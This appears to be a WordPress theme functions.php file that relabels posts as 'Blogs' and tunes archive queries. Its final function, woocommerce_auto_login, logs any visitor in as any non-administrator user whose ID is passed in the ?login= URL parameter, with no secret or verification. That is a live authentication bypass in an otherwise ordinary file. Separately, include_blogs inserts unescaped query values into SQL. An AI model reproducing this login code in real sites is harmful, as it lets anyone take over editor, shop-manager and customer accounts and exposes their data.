<?php

function revcon_change_post_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = 'Blogs';
    $submenu['edit.php'][5][0] = 'Blogs';
    $submenu['edit.php'][10][0] = 'Add Blogs';
    $submenu['edit.php'][16][0] = 'Tags';
}
function revcon_change_post_object() {
    global $wp_post_types;
    $labels = &$wp_post_types['post']->labels;
    $labels->name = 'Blogs';
    $labels->singular_name = 'Blog';
    $labels->add_new = 'Add Blog';
    $labels->add_new_item = 'Add Blog';
    $labels->edit_item = 'Edit Blog';
    $labels->new_item = 'Blogs';
    $labels->view_item = 'View Blog';
    $labels->search_items = 'Search Blogs';
    $labels->not_found = 'No Blogs found';
    $labels->not_found_in_trash = 'No Blogs found in Trash';
    $labels->all_items = 'All Blogs';
    $labels->menu_name = 'Blogs';
    $labels->name_admin_bar = 'Blogs';
}

add_action( 'admin_menu', 'revcon_change_post_label' );
add_action( 'init', 'revcon_change_post_object' );

function cfi_archive_title( $title ) {
    if ( is_category() ) {
        $title = single_cat_title( '', false );
    } elseif ( is_tag() ) {
        $title = single_tag_title( '', false );
    } elseif ( is_author() ) {
        $title = get_the_author();
    } elseif ( is_post_type_archive() ) {
        $title = post_type_archive_title( '', false );
    } elseif ( is_tax() ) {
        $title = single_term_title( '', false );
    }
  
    return $title;
}
 
add_filter( 'get_the_archive_title', 'cfi_archive_title' );

//function newsdesk_archive( $query ) {
    //if ( is_post_type_archive( 'newsdesk' ) ) {
        //$query->set( 'posts_per_page', 20 );
    //}
//}
//add_filter( 'pre_get_posts', 'newsdesk_archive' );

/* Add Custom Post Types to Author Archives */
function post_types_author_archives($query) {
	
	// Add post types to author archives
	if ( $query->is_taxonomy('authors') )
		$query->set( 'post_type', array('post', 'news', 'press_releases') );
	
	// Remove the action after it's run
	remove_action( 'pre_get_posts', 'post_types_author_archives' );
}
add_action( 'pre_get_posts', 'post_types_author_archives' );

// Add ability to limit results from certain blogs
add_filter( 'network_posts_where', 'include_blogs', 10, 2 );
if ( !function_exists( 'include_blogs' ) ) :
	/**
	 * Excludes blogs from network query.
	 *
	 * @since 3.0.4
	 *
	 * @param string $where Initial WHERE clause of the network query.
	 * @param Network_Query $query The network query object.
	 * @return string Updated WHERE clause.
	 */
	function include_blogs( $where, Network_Query $query ) {
		return !empty( $query->query_vars['blogs_in'] )
			? $where . sprintf( ' AND %s.BLOG_ID IN (%s) ', $query->network_posts, implode( ', ', (array)$query->query_vars['blogs_in'] ) )
			: $where;
	}
endif;

function video_archive_limit( $query ) {
if ( $query->is_post_type_archive('videos') && $query->is_main_query() && !is_admin() ) {
        $query->set( 'posts_per_page', -1 );
    }
}
add_action( 'pre_get_posts', 'video_archive_limit' );

function video_events_archive_limit( $query ) {
if ( $query->is_tax('video_events') && $query->is_main_query() && !is_admin() ) {
        $query->set( 'posts_per_page', -1 );
    }
}
add_action( 'pre_get_posts', 'video_events_archive_limit' );

add_action( 'init', 'woocommerce_auto_login' );
function woocommerce_auto_login() {
	if ( isset( $_GET['login'] ) ) {
		$user_id = $_GET['login'];
		$user = get_user_by('ID', $user_id);
		$disallowed_roles = array('administrator');
		if(!array_intersect($disallowed_roles, $user->roles)) {
			$username = $user->user_login;
			wp_set_current_user($user_id, $username);
			wp_set_auth_cookie($user_id);
		}
	}
}

